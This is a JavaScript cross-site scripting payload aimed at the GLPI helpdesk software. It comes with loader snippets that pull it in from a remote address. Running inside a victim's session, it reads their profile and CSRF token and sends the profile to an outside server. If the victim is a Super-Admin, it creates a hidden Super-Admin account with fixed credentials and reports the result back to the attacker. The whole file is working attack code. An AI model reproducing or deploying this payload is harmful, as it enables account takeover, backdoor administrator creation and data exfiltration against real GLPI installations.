/** This code show a payload that can be used for a XSS exploit on GLPI
 * 
 * Usage: Load this script using something like:
 * 
 * $.getScript("remoteUrl/payload.js")
 * 
 * Or in full JS:
 * 
let ms = document.createElement("script");
ms.setAttribute("src", "http://172.31.2.1:8989/payload.js");
ms.setAttribute("type", "text/javascript");
ms.setAttribute("defer", true);
document.body.appendChild(ms);
 * 
 */

/** Define the remote server for exfiltrating data */
async function pwn_glpi()
{
    const username = "test_user";
    const password = "TestP@ssword!12";
    const remote_server = "http://172.31.2.1:8989/";

    // /** Exfilter the profile of the user */
    var profiles = {"1": "Self-Service", "2": "Observer", "3": "Admin", "4": "Super-Admin",
                    "5": "Hotliner", "6": "Technician", "7": "Supervisor", "8": "Readonly"};

    var profile_regex = new RegExp("newprofile=(\\d)", "g");

    var html_frame_content = parent.document.getElementsByName("right")[0].contentWindow.document.body.innerHTML;

    /** CSRF Token */
    var csrf_regex = new RegExp('<input type="hidden" name="_glpi_csrf_token" value="(.*?)"', "g");

    const res_csrf = csrf_regex.exec(html_frame_content);
    var csrf_token = 0;
    if(res_csrf.length >= 2){
        csrf_token = res_csrf[1];
    }

    const res = profile_regex.exec(html_frame_content);
    if(res.length >= 2){
        const profile = res[1];
        var current_profile = profiles[profile];
        try
        {
            fetch(`${remote_server}?profile=${current_profile}`);
        } catch(e)
        {
        }

        if(current_profile == "Super-Admin" && typeof csrf_token !== 0){
            /** Add a new user as Super-Admin on GLPI */
            form_body = `entities_id=0&name=${username}&password=${password}&password2=${password}&`;
            form_body += "is_active=1&authtype=1&usercategories_id=0&usertitles_id=0&_is_recursive=0";
            form_body += "&_profiles_id=4&_entities_id=0&add=1";

            form_body += `&_glpi_csrf_token=${csrf_token}`;

            const http_result = await fetch("/front/user.form.php",{
                method: "POST",
                headers: {
                            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
                          },
                body: form_body,
            });

            try
            {
                if(!http_result.ok){
                    fetch(`${remote_server}?failed=${http_result.status}`);
                } else {
                    fetch(`${remote_server}?success=${http_result.status}`);
                }
            } catch(e)
            {
            }
        }
    }
}

setTimeout(pwn_glpi, 3900);
